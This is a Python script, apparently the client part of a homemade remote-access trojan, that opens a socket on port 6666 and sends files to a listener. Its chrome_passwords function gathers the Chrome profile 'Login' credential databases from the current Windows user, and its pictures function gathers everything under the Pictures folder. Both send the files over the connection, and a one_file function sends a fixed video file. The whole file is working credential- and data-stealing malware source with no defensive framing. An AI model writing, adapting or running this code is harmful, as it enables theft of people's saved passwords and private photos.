import socket            
import glob, os
import time

host = socket.socket()        

port = 6666            

host.connect(('localhost', port))

host.send('client is connected to host'.encode())

print(host.recv(1024).decode())

def chrome_passwords():
    data = []

    for file in glob.glob(rf'C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data\*\*', recursive=True):
        print(file)
        if 'Login' in file:
            data.append(file)

    print (data)

    host.send(str(len(data)).encode())

    print(host.recv(1024).decode())

    for file in data:
        with open(file, 'rb') as readfile:
            host.send(str(os.stat(file).st_size).encode())
            host.recv(1024).decode()
            host.send(readfile.read())


def pictures():
    data = []
    file_ext = []
    for file in glob.glob(rf'C:\Users\{os.getlogin()}\Pictures\*\*', recursive=True):
        print(file)
        file_name, file_ext1 = os.path.splitext(file)
        file_ext.append(file_ext1)
        data.append(file)
    
    print(data)
    print(len(data))

    host.send(str(len(data)).encode())

    print(host.recv(1024).decode())

    for ext in file_ext:
        host.send(str(ext).encode())
        host.recv(1024).decode()

    print(file_ext)

    for file in data:
        with open(file, 'rb') as readfile:
            host.send(str(os.stat(file).st_size).encode())
            host.recv(1024).decode()
            host.send(readfile.read())

def one_file():
    with open(r"C:\Users\Joe\.vscode\code files\rat\video.mp4", 'rb') as file:
        host.send(str(os.stat(r'C:\Users\Joe\.vscode\code files\rat\video.mp4').st_size).encode())
        host.recv(1024).decode()
        host.send(file.read())

    with open(r"C:\Users\Joe\.vscode\code files\rat\video.mp4", 'rb') as file:
        host.send(str(os.stat(r'C:\Users\Joe\.vscode\code files\rat\video.mp4').st_size).encode())
        host.recv(1024).decode()
        host.send(file.read())


pictures()

host.close()

host = socket.socket()   
host.connect(('localhost', port))

chrome_passwords()

host.close()